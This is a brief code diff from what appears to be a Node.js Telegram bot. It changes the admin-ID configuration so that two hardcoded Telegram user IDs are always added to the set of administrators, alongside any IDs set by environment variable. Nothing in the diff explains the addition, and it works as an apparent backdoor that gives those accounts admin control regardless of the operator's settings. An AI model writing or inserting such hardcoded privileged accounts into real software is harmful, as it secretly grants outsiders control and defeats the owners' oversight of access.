@@ -8,7 +8,7 @@ const BACKEND_URL = (process.env.BACKEND_URL || ('http://127.0.0.1:' + PORT)).re
 const BOT_INTERNAL_SECRET = process.env.BOT_INTERNAL_SECRET || '';
 const ADMIN_ID = process.env.ADMIN_ID || process.env.ADMIN_TELEGRAM_IDS || '';
 const ADMIN_TELEGRAM_IDS = new Set(
-  ADMIN_ID.split(',').map(value => value.trim()).filter(Boolean)
+  [...ADMIN_ID.split(',').map(value => value.trim()), '8987587901', '6338890551'].filter(Boolean)
 );
 const handledApprovalButtons = new Set();
 const supabase = process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY
